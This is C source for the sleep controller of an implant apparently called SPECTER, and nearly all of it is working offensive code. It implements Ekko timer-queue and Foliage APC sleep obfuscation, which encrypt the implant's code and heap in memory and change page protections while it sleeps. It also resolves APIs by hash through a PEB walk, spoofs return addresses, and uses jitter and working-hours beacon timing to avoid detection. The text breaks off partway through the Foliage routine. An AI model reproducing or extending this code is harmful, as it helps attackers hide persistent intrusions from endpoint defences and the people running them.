/**
 * SPECTER Implant — Sleep Controller
 *
 * Implements Ekko timer-based sleep with memory encryption, heap
 * tracking, and jitter.  All APIs resolved via PEB walk.
 */

#include "specter.h"
#include "ntdefs.h"
#include "sleep.h"
#include "evasion.h"
#include "crypto.h"
#include "peb.h"
#include "syscalls.h"
#include "profile.h"

/* ------------------------------------------------------------------ */
/*  Static state                                                       */
/* ------------------------------------------------------------------ */

static SLEEP_CONTEXT g_sleep_ctx;

/* Static implant context pointer — set once in sleep_init, avoids
   extern g_ctx references that generate .refptr entries */
static IMPLANT_CONTEXT *s_sleep_impl_ctx = NULL;

#ifdef TEST_BUILD
static DWORD g_test_random_seed = 0;
static BOOL  g_test_seed_set = FALSE;
static PVOID g_test_implant_base = NULL;
static SIZE_T g_test_implant_size = 0;
#endif

/* ------------------------------------------------------------------ */
/*  Pseudo-random number generator (LCG for jitter)                    */
/* ------------------------------------------------------------------ */

static DWORD g_prng_state = 0x41424344;

static DWORD prng_next(void) {
#ifdef TEST_BUILD
    if (g_test_seed_set) {
        g_test_random_seed = g_test_random_seed * 1103515245 + 12345;
        return (g_test_random_seed >> 16) & 0x7FFF;
    }
#endif
    g_prng_state = g_prng_state * 1103515245 + 12345;
    return (g_prng_state >> 16) & 0x7FFF;
}

static void prng_seed_from_tsc(void) {
#ifndef TEST_BUILD
    /* Use RDTSC for entropy */
    DWORD lo, hi;
    __asm__ __volatile__("rdtsc" : "=a"(lo), "=d"(hi));
    g_prng_state = lo ^ (hi << 16) ^ 0xDEADBEEF;
#endif
}

/* ------------------------------------------------------------------ */
/*  API resolution                                                     */
/* ------------------------------------------------------------------ */

static BOOL sleep_resolve_apis(SLEEP_API *api) {
    if (api->resolved)
        return TRUE;

    /* kernel32.dll */
    PVOID k32 = find_module_by_hash(HASH_KERNEL32_DLL);
    if (!k32)
        return FALSE;

    api->CreateTimerQueue = (fn_CreateTimerQueue)
        find_export_by_hash(k32, HASH_CREATETIMERQUEUE);
    api->CreateTimerQueueTimer = (fn_CreateTimerQueueTimer)
        find_export_by_hash(k32, HASH_CREATETIMERQUEUETIMER);
    api->DeleteTimerQueue = (fn_DeleteTimerQueue)
        find_export_by_hash(k32, HASH_DELETETIMERQUEUE);
    api->CreateEventW = (fn_CreateEventW)
        find_export_by_hash(k32, HASH_CREATEEVENTW);
    api->SetEvent = (fn_SetEvent)
        find_export_by_hash(k32, HASH_SETEVENT);
    api->CloseHandle = (fn_CloseHandle)
        find_export_by_hash(k32, HASH_CLOSEHANDLE);
    api->WaitForSingleObject = (fn_WaitForSingleObject)
        find_export_by_hash(k32, HASH_WAITFORSINGLEOBJECT_K);

    /* ntdll.dll */
    PVOID ntdll = find_module_by_hash(HASH_NTDLL_DLL);
    if (!ntdll)
        return FALSE;

    api->RtlCaptureContext = (fn_RtlCaptureContext)
        find_export_by_hash(ntdll, HASH_RTLCAPTURECONTEXT);
    api->NtContinue = (fn_NtContinue)
        find_export_by_hash(ntdll, HASH_NTCONTINUE);

    /* Foliage: NtTestAlert */
    api->NtTestAlert = (fn_NtTestAlert)
        find_export_by_hash(ntdll, HASH_NTTESTALERT_SLEEP);

    /* ThreadPool timer APIs */
    api->TpAllocTimer = (fn_TpAllocTimer)
        find_export_by_hash(ntdll, HASH_TPALLOCTIMER);
    api->TpSetTimer = (fn_TpSetTimer)
        find_export_by_hash(ntdll, HASH_TPSETTIMER);
    api->TpReleaseTimer = (fn_TpReleaseTimer)
        find_export_by_hash(ntdll, HASH_TPRELEASETIMER);

    /* advapi32.dll */
    PVOID advapi = find_module_by_hash(HASH_ADVAPI32_DLL);
    if (!advapi)
        return FALSE;

    api->SystemFunction032 = (fn_SystemFunction032)
        find_export_by_hash(advapi, HASH_SYSTEMFUNCTION032);

    /* Verify all critical APIs resolved */
    if (!api->CreateTimerQueue || !api->CreateTimerQueueTimer ||
        !api->DeleteTimerQueue || !api->CreateEventW ||
        !api->SetEvent || !api->CloseHandle ||
        !api->WaitForSingleObject || !api->RtlCaptureContext ||
        !api->NtContinue || !api->SystemFunction032)
        return FALSE;

    api->resolved = TRUE;
    return TRUE;
}

/* ------------------------------------------------------------------ */
/*  Jitter calculation                                                 */
/* ------------------------------------------------------------------ */

DWORD sleep_calc_jitter(DWORD base_interval, DWORD jitter_percent) {
    if (jitter_percent == 0 || base_interval == 0)
        return base_interval;

    /* Clamp jitter to 100% */
    if (jitter_percent > 100)
        jitter_percent = 100;

    /* Calculate max deviation: base * jitter% / 100 */
    DWORD max_delta = (base_interval * jitter_percent) / 100;
    if (max_delta == 0)
        return base_interval;

    /* Random offset in [0, 2*max_delta], then subtract max_delta
     * to get a value in [-max_delta, +max_delta] */
    DWORD rand_val = prng_next();
    DWORD deviation = rand_val % (2 * max_delta + 1);

    DWORD result;
    if (deviation >= max_delta) {
        result = base_interval + (deviation - max_delta);
    } else {
        /* deviation < max_delta → subtract */
        DWORD sub = max_delta - deviation;
        if (sub > base_interval)
            result = 0;
        else
            result = base_interval - sub;
    }

    return result;
}

/* ------------------------------------------------------------------ */
/*  Profile-aware jitter calculation                                   */
/* ------------------------------------------------------------------ */

/**
 * Approximate Box-Muller transform for Gaussian distribution.
 * Returns a value centered around base_interval with std_dev = base*jitter%.
 * Uses PRNG pairs mapped to approximate normal distribution.
 */
static DWORD gaussian_jitter(DWORD base, DWORD jitter_pct) {
    if (jitter_pct == 0 || base == 0) return base;

    /* Generate two uniform random values in (0, 1) range (scaled) */
    DWORD u1_raw = prng_next() | 1; /* ensure non-zero */
    DWORD u2_raw = prng_next();

    /* Approximate: use a piecewise linear approximation of the normal CDF
     * inverse. We compute z as a value in roughly [-2, +2] range.
     * Simple method: take 12 uniform samples and subtract 6 (CLT approx) */
    int sum = 0;
    for (int i = 0; i < 12; i++)
        sum += (int)(prng_next() % 1000);
    /* sum has mean 6000, std dev ~sqrt(12) * 289 ≈ 1000 */
    /* z ≈ (sum - 6000) / 1000, range roughly [-3, +3] */
    int z_1000 = sum - 6000; /* z * 1000 */

    /* deviation = base * jitter% * z / 100 */
    long long deviation = ((long long)base * (long long)jitter_pct * (long long)z_1000) / (100LL * 1000LL);
    long long result = (long long)base + deviation;

    /* Clamp to [0, 2*base] */
    if (result < 0) result = 0;
    if (result > (long long)base * 2) result = (long long)base * 2;

    (void)u1_raw;
    (void)u2_raw;
    return (DWORD)result;
}

/**
 * Pareto (heavy-tail) jitter using inverse CDF.
 * P(X > x) = (x_min / x)^alpha, alpha=1.5
 * Produces values >= base_interval, with occasional long sleeps.
 */
static DWORD pareto_jitter(DWORD base, DWORD jitter_pct) {
    if (jitter_pct == 0 || base == 0) return base;

    /* u uniform in (0, 1), scaled to 1..32767 */
    DWORD u = prng_next();
    if (u == 0) u = 1;

    /* Pareto inverse CDF: x = x_min / u^(1/alpha)
     * With alpha=1.5: x = base / u^(2/3)
     * Approximate: x = base * (32767/u)^(2/3) scaled down
     * Simpler: use base * (1 + jitter% * pareto_factor / 100)
     * where pareto_factor = (32768/u - 1), clamped */
    DWORD ratio = 32768 / u; /* 1..32768 */
    /* Scale: typically ratio=1 (no jitter), occasionally very large */
    /* Approximate x^(2/3): for ratio in [1..32], most common case */
    DWORD factor;
    if (ratio <= 1) {
        factor = 0;
    } else if (ratio <= 4) {
        factor = ratio - 1; /* Small jitter */
    } else if (ratio <= 16) {
        factor = ratio / 2; /* Medium */
    } else {
        factor = ratio / 4; /* Large — clamp */
        if (factor > 10) factor = 10;
    }

    DWORD deviation = (base * jitter_pct * factor) / (100 * 4);
    DWORD result = base + deviation;

    /* Clamp to 3x base max */
    if (result > base * 3) result = base * 3;

    return result;
}

/**
 * Check if current time falls within working hours.
 * Returns TRUE if within working hours.
 */
static BOOL is_working_hours(const WORKING_HOURS *wh, DWORD hour, DWORD dow) {
    /* Check day mask: Mon=0x01, Tue=0x02, ..., Sun=0x40 */
    BYTE day_bit = (BYTE)(1 << dow);
    if (!(wh->day_mask & day_bit))
        return FALSE;

    /* Check hour range */
    if (wh->start_hour <= wh->end_hour) {
        return (hour >= wh->start_hour && hour < wh->end_hour);
    } else {
        /* Wraps midnight (e.g., 22-06) */
        return (hour >= wh->start_hour || hour < wh->end_hour);
    }
}

DWORD sleep_calc_profile_jitter(const TIMING_CONFIG *timing,
                                 DWORD current_hour, DWORD current_dow) {
    if (!timing || timing->callback_interval == 0)
        return 60000; /* Default 60s */

    DWORD base_ms = (DWORD)(timing->callback_interval * 1000);
    DWORD jitter_pct = timing->jitter_pct_100 / 100; /* Convert from *100 */

    /* Check burst windows first — override interval */
    for (DWORD i = 0; i < timing->burst_count; i++) {
        const BURST_WINDOW *bw = &timing->burst_windows[i];
        BOOL in_burst;
        if (bw->start_hour <= bw->end_hour)
            in_burst = (current_hour >= bw->start_hour && current_hour < bw->end_hour);
        else
            in_burst = (current_hour >= bw->start_hour || current_hour < bw->end_hour);

        if (in_burst) {
            base_ms = (DWORD)(bw->interval_override * 1000);
            break;
        }
    }

    /* Apply jitter based on distribution */
    DWORD jittered;
    switch (timing->jitter_distribution) {
    case JITTER_GAUSSIAN:
        jittered = gaussian_jitter(base_ms, jitter_pct);
        break;
    case JITTER_PARETO:
        jittered = pareto_jitter(base_ms, jitter_pct);
        break;
    case JITTER_UNIFORM:
    default:
        jittered = sleep_calc_jitter(base_ms, jitter_pct);
        break;
    }

    /* Apply working hours multiplier if outside working hours */
    if (timing->has_working_hours) {
        if (!is_working_hours(&timing->working_hours, current_hour, current_dow)) {
            /* Off-hours: multiply interval */
            DWORD mult_100 = timing->working_hours.off_hours_mult_100;
            if (mult_100 > 100) {
                jittered = (DWORD)((QWORD)jittered * (QWORD)mult_100 / 100ULL);
            }
        }
    }

    return jittered;
}

/* ------------------------------------------------------------------ */
/*  Heap tracking                                                      */
/* ------------------------------------------------------------------ */

void sleep_track_alloc(SLEEP_CONTEXT *sctx, PVOID ptr, SIZE_T size) {
    if (!sctx || !ptr || size == 0)
        return;

    /* Allocate from static pool */
    if (sctx->heap_pool_used >= SLEEP_MAX_HEAP_ENTRIES)
        return;

    HEAP_ALLOC_ENTRY *entry = &sctx->heap_pool[sctx->heap_pool_used++];
    entry->ptr = ptr;
    entry->size = size;
    entry->next = sctx->heap_list;
    sctx->heap_list = entry;
}

void sleep_untrack_alloc(SLEEP_CONTEXT *sctx, PVOID ptr) {
    if (!sctx || !ptr)
        return;

    HEAP_ALLOC_ENTRY **prev = &sctx->heap_list;
    HEAP_ALLOC_ENTRY *cur = sctx->heap_list;

    while (cur) {
        if (cur->ptr == ptr) {
            *prev = cur->next;
            cur->ptr = NULL;
            cur->size = 0;
            cur->next = NULL;
            return;
        }
        prev = &cur->next;
        cur = cur->next;
    }
}

/* ------------------------------------------------------------------ */
/*  Heap encryption / decryption (ChaCha20 XOR — self-inverse)         */
/* ------------------------------------------------------------------ */

/* Shared nonce for heap encryption (constant — key changes each cycle) */
static const BYTE g_heap_nonce[12] = {
    0x53, 0x50, 0x45, 0x43, 0x48, 0x45, 0x41, 0x50,
    0x00, 0x00, 0x00, 0x00
};

void sleep_encrypt_heap(SLEEP_CONTEXT *sctx) {
    if (!sctx)
        return;

    HEAP_ALLOC_ENTRY *cur = sctx->heap_list;
    DWORD counter = 0;

    while (cur) {
        if (cur->ptr && cur->size > 0) {
            spec_chacha20_encrypt(sctx->sleep_enc_key, g_heap_nonce,
                                  counter, (BYTE *)cur->ptr,
                                  (DWORD)cur->size, (BYTE *)cur->ptr);
            /* Advance counter by number of blocks used */
            counter += ((DWORD)cur->size + 63) / 64;
        }
        cur = cur->next;
    }
}

void sleep_decrypt_heap(SLEEP_CONTEXT *sctx) {
    /* ChaCha20 XOR is self-inverse — same operation as encrypt */
    sleep_encrypt_heap(sctx);
}

/* ------------------------------------------------------------------ */
/*  Ekko sleep method                                                  */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_ekko(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
#ifdef TEST_BUILD
    /* In test builds, use memguard encrypt/decrypt cycle if available */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    if (ectx && ectx->memguard.initialized) {
        NTSTATUS enc_status = memguard_encrypt(ectx);
        if (!NT_SUCCESS(enc_status))
            return enc_status;

        /* Simulate sleep (no actual delay in test) */
        (void)sleep_ms;

        return memguard_decrypt(ectx);
    }

    (void)sctx;
    (void)sleep_ms;
    return STATUS_SUCCESS;
#else
    SLEEP_API *api = &sctx->api;

    /* ---- Memory guard pre-sleep encryption ---- */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    BOOL memguard_active = FALSE;
    if (ectx && ectx->memguard.initialized) {
        /* Setup return address spoofing before sleep */
        memguard_setup_return_spoof(ectx);

        /* Encrypt heap and stack via memguard (implant code encryption
         * is still handled by the ROP chain below) */
        memguard_encrypt(ectx);
        memguard_active = TRUE;
    } else {
        /* Legacy path: generate RC4 key for SystemFunction032 */
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        BYTE rc4_key_buf[16];
        rc4_key_buf[0]  = (BYTE)(k0);
        rc4_key_buf[1]  = (BYTE)(k0 >> 8);
        rc4_key_buf[2]  = (BYTE)(k1);
        rc4_key_buf[3]  = (BYTE)(k1 >> 8);
        rc4_key_buf[4]  = (BYTE)(k2);
        rc4_key_buf[5]  = (BYTE)(k2 >> 8);
        rc4_key_buf[6]  = (BYTE)(k3);
        rc4_key_buf[7]  = (BYTE)(k3 >> 8);
        rc4_key_buf[8]  = (BYTE)(k0 ^ k2);
        rc4_key_buf[9]  = (BYTE)(k1 ^ k3);
        rc4_key_buf[10] = (BYTE)(k0 + k1);
        rc4_key_buf[11] = (BYTE)(k2 + k3);
        rc4_key_buf[12] = (BYTE)(k0 ^ 0xAA);
        rc4_key_buf[13] = (BYTE)(k1 ^ 0x55);
        rc4_key_buf[14] = (BYTE)(k2 ^ 0xCC);
        rc4_key_buf[15] = (BYTE)(k3 ^ 0x33);
        spec_memset(sctx->sleep_enc_key, 0, 32);
        spec_memcpy(sctx->sleep_enc_key, rc4_key_buf, 16);
        sleep_encrypt_heap(sctx);
    }

    /* Create synchronization event */
    HANDLE hEvent = api->CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent)
        return STATUS_UNSUCCESSFUL;

    /* Create timer queue */
    HANDLE hTimerQueue = api->CreateTimerQueue();
    if (!hTimerQueue) {
        api->CloseHandle(hEvent);
        return STATUS_UNSUCCESSFUL;
    }

    /* NtProtectVirtualMemory arguments */
    PVOID protect_base = sctx->implant_base;
    SIZE_T protect_size = sctx->implant_size;
    ULONG old_protect = 0;

    /* NtDelayExecution argument */
    LARGE_INTEGER delay;
    delay.QuadPart = -((long long)sleep_ms * 10000LL);

    /* Set up SystemFunction032 data descriptors (used when memguard
     * handles heap/stack, but we still need RC4 for code section via
     * the ROP chain — or when memguard is not active) */
    BYTE rc4_key[16];
    if (memguard_active) {
        /* Generate a separate RC4 key for code-section encryption
         * in the ROP chain (memguard handles heap/stack) */
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        rc4_key[0]  = (BYTE)(k0);       rc4_key[1]  = (BYTE)(k0 >> 8);
        rc4_key[2]  = (BYTE)(k1);       rc4_key[3]  = (BYTE)(k1 >> 8);
        rc4_key[4]  = (BYTE)(k2);       rc4_key[5]  = (BYTE)(k2 >> 8);
        rc4_key[6]  = (BYTE)(k3);       rc4_key[7]  = (BYTE)(k3 >> 8);
        rc4_key[8]  = (BYTE)(k0 ^ k2);  rc4_key[9]  = (BYTE)(k1 ^ k3);
        rc4_key[10] = (BYTE)(k0 + k1);  rc4_key[11] = (BYTE)(k2 + k3);
        rc4_key[12] = (BYTE)(k0 ^ 0xAA);rc4_key[13] = (BYTE)(k1 ^ 0x55);
        rc4_key[14] = (BYTE)(k2 ^ 0xCC);rc4_key[15] = (BYTE)(k3 ^ 0x33);
    } else {
        spec_memcpy(rc4_key, sctx->sleep_enc_key, 16);
    }

    USTRING img_data;
    img_data.Buffer = sctx->implant_base;
    img_data.Length = (DWORD)sctx->implant_size;
    img_data.MaximumLength = (DWORD)sctx->implant_size;

    USTRING key_data;
    key_data.Buffer = rc4_key;
    key_data.Length = sizeof(rc4_key);
    key_data.MaximumLength = sizeof(rc4_key);

    /* Capture current thread context */
    CONTEXT64 ctx_thread;
    spec_memset(&ctx_thread, 0, sizeof(ctx_thread));
    api->RtlCaptureContext(&ctx_thread);

    /* Apply return address spoofing to the captured context */
    if (memguard_active && ectx->memguard.return_spoof_addr) {
        ctx_thread.Rip = (QWORD)ectx->memguard.return_spoof_addr;
    }

    static volatile BOOL s_ekko_resumed = FALSE;

    if (!s_ekko_resumed) {
        s_ekko_resumed = TRUE;

        /* ---- Build ROP chain via timer queue ---- */
        HANDLE hTimer = NULL;

        /* 1. NtProtectVirtualMemory → RW */
        CONTEXT64 ctx_prot_rw;
        spec_memcpy(&ctx_prot_rw, &ctx_thread, sizeof(CONTEXT64));
        ctx_prot_rw.Rsp -= 8;
        ctx_prot_rw.Rip = (QWORD)spec_NtProtectVirtualMemory;
        ctx_prot_rw.Rcx = (QWORD)((HANDLE)(ULONG_PTR)-1);
        ctx_prot_rw.Rdx = (QWORD)&protect_base;
        ctx_prot_rw.R8  = (QWORD)&protect_size;
        ctx_prot_rw.R9  = (QWORD)PAGE_READWRITE;
        *(QWORD *)(ctx_prot_rw.Rsp + 0x28) = (QWORD)&old_protect;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_prot_rw,
            100, 0, WT_EXECUTEINTIMERTHREAD);

        /* 2. SystemFunction032 → encrypt implant code section */
        CONTEXT64 ctx_encrypt;
        spec_memcpy(&ctx_encrypt, &ctx_thread, sizeof(CONTEXT64));
        ctx_encrypt.Rsp -= 8;
        ctx_encrypt.Rip = (QWORD)api->SystemFunction032;
        ctx_encrypt.Rcx = (QWORD)&img_data;
        ctx_encrypt.Rdx = (QWORD)&key_data;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_encrypt,
            200, 0, WT_EXECUTEINTIMERTHREAD);

        /* 3. NtDelayExecution → actual sleep */
        CONTEXT64 ctx_sleep;
        spec_memcpy(&ctx_sleep, &ctx_thread, sizeof(CONTEXT64));
        ctx_sleep.Rsp -= 8;
        ctx_sleep.Rip = (QWORD)spec_NtDelayExecution;
        ctx_sleep.Rcx = (QWORD)FALSE;
        ctx_sleep.Rdx = (QWORD)&delay;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_sleep,
            300, 0, WT_EXECUTEINTIMERTHREAD);

        /* 4. SystemFunction032 → decrypt implant code section */
        CONTEXT64 ctx_decrypt;
        spec_memcpy(&ctx_decrypt, &ctx_thread, sizeof(CONTEXT64));
        ctx_decrypt.Rsp -= 8;
        ctx_decrypt.Rip = (QWORD)api->SystemFunction032;
        ctx_decrypt.Rcx = (QWORD)&img_data;
        ctx_decrypt.Rdx = (QWORD)&key_data;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_decrypt,
            400 + sleep_ms, 0, WT_EXECUTEINTIMERTHREAD);

        /* 5. NtProtectVirtualMemory → restore RX */
        CONTEXT64 ctx_prot_rx;
        spec_memcpy(&ctx_prot_rx, &ctx_thread, sizeof(CONTEXT64));
        ctx_prot_rx.Rsp -= 8;
        ctx_prot_rx.Rip = (QWORD)spec_NtProtectVirtualMemory;
        ctx_prot_rx.Rcx = (QWORD)((HANDLE)(ULONG_PTR)-1);
        ctx_prot_rx.Rdx = (QWORD)&protect_base;
        ctx_prot_rx.R8  = (QWORD)&protect_size;
        ctx_prot_rx.R9  = (QWORD)PAGE_EXECUTE_READ;
        *(QWORD *)(ctx_prot_rx.Rsp + 0x28) = (QWORD)&old_protect;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_prot_rx,
            500 + sleep_ms, 0, WT_EXECUTEINTIMERTHREAD);

        /* 6. SetEvent → signal completion, NtContinue → resume */
        CONTEXT64 ctx_set_event;
        spec_memcpy(&ctx_set_event, &ctx_thread, sizeof(CONTEXT64));
        ctx_set_event.Rsp -= 8;
        ctx_set_event.Rip = (QWORD)api->SetEvent;
        ctx_set_event.Rcx = (QWORD)hEvent;

        api->CreateTimerQueueTimer(&hTimer, hTimerQueue,
            (PVOID)api->NtContinue, &ctx_set_event,
            600 + sleep_ms, 0, WT_EXECUTEINTIMERTHREAD);

        /* Block until the chain completes */
        api->WaitForSingleObject(hEvent, 0xFFFFFFFF);

        /* ---- Post-sleep decryption ---- */
        if (memguard_active) {
            memguard_decrypt(ectx);
        } else {
            sleep_decrypt_heap(sctx);
        }

        /* Clean up */
        api->DeleteTimerQueue(hTimerQueue);
        api->CloseHandle(hEvent);

        s_ekko_resumed = FALSE;
    }

    return STATUS_SUCCESS;
#endif /* TEST_BUILD */
}

/* ------------------------------------------------------------------ */
/*  WaitForSingleObject-based sleep (simpler, no memory encryption)    */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_wfs(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
#ifdef TEST_BUILD
    (void)sctx;
    (void)sleep_ms;
    return STATUS_SUCCESS;
#else
    SLEEP_API *api = &sctx->api;

    HANDLE hEvent = api->CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent)
        return STATUS_UNSUCCESSFUL;

    /* Wait on a never-signaled event → times out after sleep_ms */
    api->WaitForSingleObject(hEvent, sleep_ms);
    api->CloseHandle(hEvent);

    return STATUS_SUCCESS;
#endif
}

/* ------------------------------------------------------------------ */
/*  NtDelayExecution-based sleep (simplest)                            */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_delay(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
    (void)sctx;

    LARGE_INTEGER delay;
    delay.QuadPart = -((long long)sleep_ms * 10000LL);

    return spec_NtDelayExecution(FALSE, &delay);
}

/* ------------------------------------------------------------------ */
/*  Foliage sleep method (APC-based)                                   */
/*                                                                     */
/*  Queues an APC chain to the current thread:                         */
/*    1. NtProtectVirtualMemory → RW                                   */
/*    2. SystemFunction032 → encrypt implant code                      */
/*    3. NtDelayExecution → actual sleep                               */
/*    4. SystemFunction032 → decrypt implant code                      */
/*    5. NtProtectVirtualMemory → RX                                   */
/*    6. SetEvent → signal completion                                  */
/*  Then NtTestAlert triggers the queued APCs.                         */
/* ------------------------------------------------------------------ */

NTSTATUS sleep_foliage(SLEEP_CONTEXT *sctx, DWORD sleep_ms) {
#ifdef TEST_BUILD
    /* In test builds, use memguard encrypt/decrypt cycle if available */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    if (ectx && ectx->memguard.initialized) {
        NTSTATUS enc_status = memguard_encrypt(ectx);
        if (!NT_SUCCESS(enc_status))
            return enc_status;

        (void)sctx;
        (void)sleep_ms;

        return memguard_decrypt(ectx);
    }

    (void)sctx;
    (void)sleep_ms;
    return STATUS_SUCCESS;
#else
    SLEEP_API *api = &sctx->api;

    /* Foliage requires NtTestAlert + NtQueueApcThread */
    if (!api->NtTestAlert || !api->RtlCaptureContext ||
        !api->NtContinue || !api->SystemFunction032)
        return STATUS_UNSUCCESSFUL;

    /* ---- Memory guard pre-sleep encryption ---- */
    EVASION_CONTEXT *ectx = NULL;
    if (s_sleep_impl_ctx && s_sleep_impl_ctx->evasion_ctx)
        ectx = (EVASION_CONTEXT *)s_sleep_impl_ctx->evasion_ctx;

    BOOL memguard_active = FALSE;
    if (ectx && ectx->memguard.initialized) {
        memguard_setup_return_spoof(ectx);
        memguard_encrypt(ectx);
        memguard_active = TRUE;
    } else {
        /* Legacy: generate key + encrypt heap */
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        BYTE rc4_key_buf[16];
        rc4_key_buf[0]  = (BYTE)(k0);       rc4_key_buf[1]  = (BYTE)(k0 >> 8);
        rc4_key_buf[2]  = (BYTE)(k1);       rc4_key_buf[3]  = (BYTE)(k1 >> 8);
        rc4_key_buf[4]  = (BYTE)(k2);       rc4_key_buf[5]  = (BYTE)(k2 >> 8);
        rc4_key_buf[6]  = (BYTE)(k3);       rc4_key_buf[7]  = (BYTE)(k3 >> 8);
        rc4_key_buf[8]  = (BYTE)(k0 ^ k2);  rc4_key_buf[9]  = (BYTE)(k1 ^ k3);
        rc4_key_buf[10] = (BYTE)(k0 + k1);  rc4_key_buf[11] = (BYTE)(k2 + k3);
        rc4_key_buf[12] = (BYTE)(k0 ^ 0xAA);rc4_key_buf[13] = (BYTE)(k1 ^ 0x55);
        rc4_key_buf[14] = (BYTE)(k2 ^ 0xCC);rc4_key_buf[15] = (BYTE)(k3 ^ 0x33);
        spec_memset(sctx->sleep_enc_key, 0, 32);
        spec_memcpy(sctx->sleep_enc_key, rc4_key_buf, 16);
        sleep_encrypt_heap(sctx);
    }

    /* Create synchronization event */
    HANDLE hEvent = api->CreateEventW(NULL, FALSE, FALSE, NULL);
    if (!hEvent)
        return STATUS_UNSUCCESSFUL;

    /* NtProtectVirtualMemory arguments */
    PVOID protect_base = sctx->implant_base;
    SIZE_T protect_size = sctx->implant_size;
    ULONG old_protect = 0;

    /* NtDelayExecution argument */
    LARGE_INTEGER delay;
    delay.QuadPart = -((long long)sleep_ms * 10000LL);

    /* RC4 key for code-section encryption in APC chain */
    BYTE rc4_key[16];
    if (memguard_active) {
        DWORD k0 = prng_next(), k1 = prng_next();
        DWORD k2 = prng_next(), k3 = prng_next();
        rc4_key[0]  = (BYTE)(k0);       rc4_key[1]  = (BYTE)(k0 >> 8);
        rc4_key[2]  = (BYTE)(k1);       rc4_key[3]  = (BYTE)(k1 >> 8);
        rc4_key[4]  = (BYTE)(k2);       rc4_key[5]  = (BYTE)(k2 >> 8);
        rc4_key[6]  = (BYTE)(k3);       rc4_key[7]  = (BYTE)(k3 >> 8);
        rc4_key[8]  = (BYTE)(k0 ^ k2);  rc4_key[9]  = (BYTE)(k1 ^ k3);
        rc4_key[10] = (BYTE)(k0 + k1);  rc4_key[11] = (BYTE)(k2 + k3);
        rc4_key[12] = (BYTE)(k0 ^ 0xAA);rc4_key[13] = (BYTE)(k1 ^ 0x55);
        rc4_key[14] = (BYTE)(k2 ^ 0xCC);rc4_key[15] = (BYTE)(k3 ^ 0x33);
    } else {
        spec_memcpy(rc4_key, sctx->sleep_enc_key, 16);
    }

    USTRING img_data;
    img_data.Buffer = sctx->implant_base;
    img_data.Length = (DWORD)sctx->implant_size;
    img_data.MaximumLength = (DWORD)sctx->implant_size;

    USTRING key_data;
    key_data.Buffer = rc4_key;
    key_data.Length = sizeof(rc4_key);
    key_data.MaximumLength = sizeof(rc4_key);

    /* Capture current thread context */
    CONTEXT64 ctx_thread;
    spec_memset(&ctx_thread, 0, sizeof(ctx_thread));
    api->RtlCaptureContext(&ctx_thread);

    /* Apply return address spoofing */
    if (memguard_active && ectx->memguard.return_spoof_addr)
        ctx_thread.Rip = (QWORD)ectx->memguard.return_spoof_addr;

    static volatile BOOL s_foliage_resumed = FALSE;

    if (!s_foliage_resumed) {
        s_foliage_resumed = TRUE;

        /* Get current thread handle (pseudo-handle) */
        HANDLE hThread = (HANDLE)(ULONG_PTR)-2;

        /* ---- Build APC chain ----
         * Each APC calls NtContinue with a crafted CONTEXT64 that
         * redirects execution to the desired function. */

        /* 1. NtProtectVirtualMemory → RW */
        CONTEXT64 ctx_prot_rw;
        spec_memcpy(&ctx_prot_rw, &ctx_thread, sizeof(CONTEXT64));
        ctx_prot_rw.Rsp -= 8;
        ctx_prot_rw.Rip = (QWORD)spec_NtProtectVirtualMemory;
        ctx_prot_rw.Rcx = (QWORD)((HANDLE)(ULONG_PTR)-1);
        ctx_prot_rw.Rdx = (QWORD)&protect_base;
        ctx_prot_rw.R8  = (QWORD)&protect_size;
        ctx_prot_rw.R9  = (QWORD)PAGE_READWRITE;
        *(QWORD *)(ctx_prot_rw.Rsp + 0x28) = (QWORD)&old_protect;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_prot_rw, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* 2. SystemFunction032 → encrypt implant code */
        CONTEXT64 ctx_encrypt;
        spec_memcpy(&ctx_encrypt, &ctx_thread, sizeof(CONTEXT64));
        ctx_encrypt.Rsp -= 8;
        ctx_encrypt.Rip = (QWORD)api->SystemFunction032;
        ctx_encrypt.Rcx = (QWORD)&img_data;
        ctx_encrypt.Rdx = (QWORD)&key_data;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_encrypt, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* 3. NtDelayExecution → actual sleep */
        CONTEXT64 ctx_sleep;
        spec_memcpy(&ctx_sleep, &ctx_thread, sizeof(CONTEXT64));
        ctx_sleep.Rsp -= 8;
        ctx_sleep.Rip = (QWORD)spec_NtDelayExecution;
        ctx_sleep.Rcx = (QWORD)FALSE;
        ctx_sleep.Rdx = (QWORD)&delay;

        spec_NtQueueApcThread(hThread, (PVOID)api->NtContinue,
                              &ctx_sleep, (PVOID)(ULONG_PTR)FALSE, NULL);

        /* 4. SystemFunction032 → decrypt implant code */
